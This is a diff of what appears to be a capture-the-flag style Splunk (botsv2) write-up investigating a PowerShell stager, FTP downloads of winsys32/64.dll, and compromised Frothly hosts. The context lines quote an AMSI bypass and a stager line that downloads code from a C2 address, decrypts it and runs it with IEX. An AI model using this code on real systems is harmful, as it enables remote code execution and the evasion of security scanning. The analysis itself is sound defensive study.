@@ -814,7 +814,7 @@ AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 ```
 [ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed',....
 ;$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
-
+```
 **Key Indicators**
 
 AMSI Bypass
@@ -832,16 +832,13 @@ Connection to attacker C2 IP we have seen earlier:
 ```
 Downloads the payload, decrypts and executes with IEX.
 
-The other FTP command was related but don't directly to this stager.
 
-```
 
-```
-Closer look at command line field in interesting fields there was unusual ftp download
+**The other FTP command was related but don't directly to this stager**
 
-Most files in FTP traffic listed had some purpose likely related to C2 interactions:
-Earlier powershell commands run after these files were transferred by FTP by 2 days. FTP method = RETR.
-
+- Closer look at command line field in interesting fields there was unusual ftp download. 
+- Most files in FTP traffic listed had some purpose likely related to C2 interactions:
+- FTP method = RETR.
 ```
 index=botsv2  sourcetype="stream:ftp" ("GET" OR "RETR")
 ```
@@ -876,7 +873,6 @@ Time (UTC)	Source IP	Destination IP	File
 2017-08-24 04:00:12	10.0.2.109	160.153.91.7:21	wget64.exe
 2017-08-24 04:00:16	10.0.2.109	160.153.91.7:21	winsys64.dll
 2017-08-24 04:00:16	10.0.2.109	160.153.91.7:21	나는_데이비드를_사랑한다.hwp
-
 ```
 
 From earlier search, taking more in depth look at those related to other command listed for FTP using winsys64.dll we have 3 events:
@@ -887,6 +883,8 @@ It turns out they are also repeated with winsys32.dll:
 ```
 index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" powershell winsys32.dll
 ```
+Here the two sets are combined:
+```
 Date			Host			User			FTP Script		Cookie
 24 Aug 03:36	wrk-btun	billy.tun		winsys32.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
 24 Aug 04:00	wrk-klagerf	service3		winsys32.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
@@ -894,7 +892,7 @@ Date			Host			User			FTP Script		Cookie
 26 Aug 05:28	wrk-klagerf	service3		winsys64.dll	MvCdddPqFQ54VL4OWU5ryRTUir8=
 26 Aug 05:42	wrk-btun	billy.tun		winsys64.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
 26 Aug 06:13	wrk-btun	billy.tun		winsys64.dll	lrtRHKkA6IL5h/d8Ekk6QsxyPvk=
-
+```
 
 Looking closer these look likely post compromise activity downloading the same events encoded script from earlier finding:
 
@@ -902,7 +900,7 @@ Source IP		Destination IP	Destination Port
 10.0.2.109		160.153.91.721 (FTP)					
 
 Where ['/admin/get.php'](https://45.77.65.211/admin/get.php) is likely path to attackers server.
-
+```
 Time (UTC)			Host		User				Child Process				Parent Process
 2017-08-24 03:36:49	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys32.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
 2017-08-24 04:00:30	wrk-klagerf	FROTHLY\service3	ftp.exe -i -s:winsys32.dll	powershell.exe -nop -sta -w 1 -enc ...
@@ -910,8 +908,9 @@ Time (UTC)			Host		User				Child Process				Parent Process
 2017-08-26 05:28:57	wrk-klagerf	FROTHLY\service3	ftp.exe -i -s:winsys64.dll	powershell.exe -nop -sta -w 1 -enc ...
 2017-08-26 05:42:06	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys64.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
 2017-08-26 06:13:34	wrk-btun	FROTHLY\billy.tun	ftp.exe -i -s:winsys64.dll	powershell.exe -NoP -NonI -W Hidden -enc ...
+```
 
-Observation
+**Observation**
 
 Observation				Details
 Earliest event			03:36:49 on billy.tun
@@ -954,9 +953,6 @@ HWP documents have historically been used in phishing and malware campaigns targ
 
 I think the answer is more likely Billy Tun than Ryan Kovar which does not seem related.
 Just one email with kovar@yahoo.com.tw ryan appears part of name in 18 emails not with kovar same event.
-
-
-
 
 
 
